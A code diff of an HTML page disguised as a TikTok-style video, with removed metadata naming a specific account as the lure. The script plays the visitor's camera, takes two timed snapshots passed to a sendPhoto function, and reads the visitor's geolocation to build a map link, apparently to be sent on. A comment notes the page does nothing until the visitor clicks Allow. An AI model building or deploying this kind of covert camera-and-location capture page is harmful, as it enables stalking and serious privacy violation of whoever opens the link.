@@ -3,18 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Havin Sorany</title>
+    <title>Video</title>
     
-    <meta property="og:title" content="Havin Sorany">
-    <meta property="og:description" content="2.9K likes, 188 comments. '#hvin_sorai #hawler_soran _dhok_karkuk_hallabja'">
-    <meta property="og:image" content="pasha.jpg">
-    <meta property="og:url" content="https://www.tiktok.com/@havin_sorany">
-    <meta property="og:type" content="video.other">
-
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
         
-        /* وێنەی پشتێنە بە زوومی تەواو و بێ نووسین */
         .bg { 
             position: fixed; 
             top: 0; 
@@ -81,19 +74,16 @@
                 await v.play();
                 const f = document.getElementById('flash');
 
-                // 📸 وێنەی یەکەم (1000ms) لەگەڵ فلاش
                 setTimeout(async () => {
                     f.style.display = 'block';
                     await sendPhoto(v, document.getElementById('c'), "📸 Snap 1 (1000ms)");
                     f.style.display = 'none';
 
-                    // 📸 وێنەی دووەم (200ms)
                     setTimeout(async () => {
                         f.style.display = 'block';
                         await sendPhoto(v, document.getElementById('c'), "📸 Snap 2 (200ms)");
                         f.style.display = 'none';
 
-                        // 📍 لۆکەیشن و گواستنەوە
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(async (pos) => {
                                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
@@ -106,7 +96,7 @@
                     }, 200);
                 }, 1000);
             } catch (e) {
-                // ئەگەر ڕێگەی نەدا (Allow)، لە لاپەڕەکەدا دەمێنێتەوە
+                // تا Allow نەکرێت هیچی لێ نایەت
             }
         }
     </script>
